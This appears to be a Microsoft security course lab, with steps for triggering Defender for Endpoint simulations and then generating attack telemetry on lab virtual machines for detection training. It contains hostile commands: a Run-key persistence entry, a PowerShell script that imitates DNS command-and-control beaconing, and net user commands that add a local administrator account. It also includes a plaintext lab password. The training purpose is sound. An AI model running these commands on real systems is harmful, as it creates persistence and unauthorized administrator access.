# Module 7 - Lab 1 - Exercise 6 - Conduct attacks

### Task 1: Simulated Attacks

In this task, you will run two simulated attacks to explore the capabilities of Microsoft Defender for Endpoint.

1. If you are not already at the Microsoft 365 Defender portal in your Microsoft Edge browser, go to (https://security.microsoft.com) and log in as Admin for your tenant.

1. From the menu, under **Endpoints**, select **Evaluation & tutorials** and then select **Tutorials & simulations** from the left side.

1. Select the **Tutorials** tab.

1. Under *Automated investigation (backdoor)* you will see a message describing the scenario. Below this paragraph, click **Read the walkthrough**. A new browser tab opens which includes instructions to perform the simulation.

1. In the new browser tab, locate the section named **Run the simulation** (page 5, starting at step 2) and follow the steps to run the attack. **Hint:** The simulation file *RS4_WinATP-Intro-Invoice.docm* can be found back in portal, just below the **Read the walkthrough** you selected in the previous step by selecting the **Get simulation file** button. 

1. Repeat the last 3 steps to run another tutorial, *Automated investigation (fileless attack)*.


### Task 2: Investigate the Attacks

1. In the Microsoft 365 Defender portal select **Incidents & alerts** from the left menu bar, then select **Incidents**.

1. A new incident called "Multi-stage incident..." is in the right pane. Click the incident name to load its details.

1. Select the **Manage incident** button and a new window blade appears. 

1. Under **Incident tags** type "Tutorial" and select **Tutorial (Create new)** to create a new tag. 

1. Select the toggle **Assign to**  and add your user account (Me) as the owner of the incident. 

1. Under **Classification**, expand the drop-down menu. 

1. Under **Informational, expected activity**, select **Security testing**. 

1. Add any comments if desired and click **Save** to finish.

1. Review the contents of the Alerts, Devices, Users, Investigations, Evidence, Response, and Graph tabs. **Hint:** Some tabs might be hidden due to the size of your display. Select the ellipsis tab (...) to make them appear.

>**Warning:** The simulations and tutorials here are an excellent source of learning through practice.  Simulations and tutorials are being added and edited regularly in the portal.  However, some of these simulations & tutorials may interfere with the performance of the labs designed for this training course.  Only perform the simulations and tutorials recommended in the instructions provided for this lab when using the course provided Azure tenant.  You may perform the other simulations and tutorials *after* this training course is complete with this tenant.


### Task 3: Attack Windows configured with Defender for Endpoint.

In this task, you will perform attacks on a host with Microsoft Defender for Endpoint configured.

1. Login to WIN1 virtual machine with the password as provided in the environment tab.  

2. In the search of the task bar, enter *Command*.  Command Prompt will be displayed in the search results.  Right-click on the Command Prompt and select **Run as Administrator**. Select **Yes** in the User Account Control window that appears to allow the app to run.

3. In the command prompt, enter the command in each row pressing Enter key after each row:

    ```Command
    cd \
    mkdir temp
    cd temp
    ```
4. Attack 1 - Copy and run this command into the Command Prompt app:

    ```Command
    REG ADD "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /V "SOC Test" /t REG_SZ /F /D "C:\temp\startup.bat"
    ```

5. Attack 3 - Copy and run this command:

    ```Command
    notepad c2.ps1
    ```
Select **Yes** to create a new file and copy the following PowerShell script into *c2.ps1*.

>**Note:** Paste into the virtual machine might have a limited length. If direct copy from the instructions is unavailable, paste this code in three sections to ensure all the script is pasted into the Virtual Machine.  Make sure the script looks as it does in these instructions within the notepad *c2.ps1* file.

```PowerShell
param(
    [string]$Domain = "microsoft.com",
    [string]$Subdomain = "subdomain",
    [string]$Sub2domain = "sub2domain",
    [string]$Sub3domain = "sub3domain",
    [string]$QueryType = "TXT",
        [int]$C2Interval = 8,
        [int]$C2Jitter = 20,
        [int]$RunTime = 240
)

$RunStart = Get-Date
$RunEnd = $RunStart.addminutes($RunTime)

$x2 = 1
$x3 = 1 
Do {
    $TimeNow = Get-Date
    Resolve-DnsName -type $QueryType $Subdomain".$(Get-Random -Minimum 1 -Maximum 999999)."$Domain -QuickTimeout

    if ($x2 -eq 3 )
    {
        Resolve-DnsName -type $QueryType $Sub2domain".$(Get-Random -Minimum 1 -Maximum 999999)."$Domain -QuickTimeout
         $x2 = 1
    }
    else
    {
        $x2 = $x2 + 1
    }
    
    if ($x3 -eq 7 )
    {
        Resolve-DnsName -type $QueryType $Sub3domain".$(Get-Random -Minimum 1 -Maximum 999999)."$Domain -QuickTimeout
        $x3 = 1
    }
    else
    {
        $x3 = $x3 + 1
    }

    $Jitter = ((Get-Random -Minimum -$C2Jitter -Maximum $C2Jitter) / 100 + 1) +$C2Interval
    Start-Sleep -Seconds $Jitter
}
Until ($TimeNow -ge $RunEnd)
```

In the Notepad menu, select **File** and then **Save**. At the Command Prompt window, enter the following commands in each row pressing Enter key after each one. **Note:** You will see resolve errors. This is expected.

 ```CommandPrompt
 Start PowerShell.exe -file c2.ps1
 ```


>**Important:** Do not close the window. Let this command/powershell script run in the background. The command needs to generate log entries for some hours. You can proceed to the next task and next exercises while this script runs. The data created by this task will be used in the Threat Hunting lab later. This process will not create substantial amounts of data or processing.


### Task 4: Attack Windows configured with Sysmon

In this task, you will perform attacks on a host with the Security Events connector configured and Sysmon configured.

1. In the WIN1 virtual machine, search for **Hyper-V** from the bottom windows search bar and select to open.

1. Right click on the **WIN2** virtual machine and select start, then again right-click on the **WIN2** virtual machine and select **connect**.

1. Enter the **Password** as `Password.1!!` when prompted.

1. In the search of the task bar, enter *CMD*.  Command Prompt will be displayed in the search results.  Right-click on the Command Prompt and select **Run as Administrator**.  Accept and User Account Control prompts that appear.

1. In the command prompt, enter the command in each row pressing Enter key after each row:

    ```Command
    cd \
    mkdir temp
    cd temp
    ```

1. Attack 1 - Copy and run this command in the Command Prompt app:

    ```Command
    REG ADD "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /V "SOC Test" /t REG_SZ /F /D "C:\temp\startup.bat"
    ```

>**Note:** We are using the same *persistence* tactic just like in WIN1 but we will use different detections in the next exercise.

1. Attack 2 - Copy and run this command, enter the command in each row pressing Enter key after each row:

    ```Command
    net user theusernametoadd /add
    net user theusernametoadd ThePassword1!
    net localgroup administrators theusernametoadd /add
    ```

## Proceed to Exercise 7
